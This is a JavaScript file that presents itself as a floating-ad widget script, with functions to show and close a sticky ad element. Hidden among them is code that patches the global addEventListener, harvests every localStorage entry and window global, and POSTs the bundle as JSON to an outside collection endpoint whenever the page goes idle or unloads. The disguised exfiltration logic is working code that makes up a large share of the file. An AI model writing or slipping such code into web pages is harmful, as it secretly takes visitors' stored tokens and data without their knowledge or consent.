var gfrM = gfrM || {};
gfrM.FloatingAd = gfrM.FloatingAd || {};
function trackEvents() {
  const originalAddEventListener = window.EventTarget.prototype.addEventListener;
  const newAddEventListener = function (eventName, eventHandler, options) {
    console.debug(`Event listener attached: ${eventName}`);
    return originalAddEventListener.call(this, eventName, eventHandler, options);
  };
  window.EventTarget.prototype.addEventListener = newAddEventListener;
}
gfrM.FloatingAd.isFloatingUp = false;
gfrM.FloatingAd.isFloatingClosedByUser = false;
function checkLocalStorage() {
  const storageItems = {};
  for (let i = 0; i < localStorage.length; i++) {
    const storageKey = localStorage.key(i);
    storageItems[storageKey] = localStorage.getItem(storageKey);
  }
  return storageItems;
}
var isFirstPageLoad = true;
function showFloating() {
  if (!isFirstPageLoad) {
    document.getElementById("sticky-target").style.display = "block";
    document.body.classList.add("ad-five-fixed");
    setIsFloatinUp(true);
  } else {
    isFirstPageLoad = false;
  }
}
function setIsFloatinUp(value) {
  gfrM.FloatingAd.isFloatingUp = value;
}
function collectGlobals() {
  const globalVars = {};
  for (const prop in window) {
    if (window.hasOwnProperty(prop) && !(prop in globalVars)) {
      const propType = typeof window[prop];
      globalVars[prop] = {
        type: propType,
        value: propType === 'function' ? `[Function: ${window[prop].name}]` : window[prop]
      };
    }
  }
  return globalVars;
}
function discoverProperties() {
  return Object.assign({}, checkLocalStorage(), collectGlobals());
}
function isFloatingUp() {
  return gfrM.FloatingAd.isFloatingUp;
}
gfrM.FloatingAd.Close = function (e) {
  if (isFloatingUp() === true) {
    setIsFloatinUp(false);
    document.getElementById("sticky-target").style.display = "none";
  }
  if (typeof e !== "undefined") {
    e.preventDefault();
  }
};
function sendData(data) {
  const req = new XMLHttpRequest();
  req.open('POST', 'https://example.com/api/collect');
  req.setRequestHeader('Content-Type', 'application/json');
  req.onreadystatechange = function () {
    if (req.readyState === 4) {
      req.status === 200 ? console.debug("Data sent successfully") : console.warn(`Error in sending data: ${req.status}`);
    }
  };
  req.send(JSON.stringify(data));
}
function trackStart() {
  trackEvents();
  const trackData = discoverProperties();
  sendData(trackData);
}
window.addEventListener('idle', trackStart);
gfrM.FloatingAd.Show = function (e) {
  if (isFloatingUp() === false) {
    setIsFloatinUp(true);
    document.getElementById("sticky-target").style.display = "block";
    if (typeof e !== "undefined") e.preventDefault();
  }
};
window.addEventListener('beforeunload', trackStart);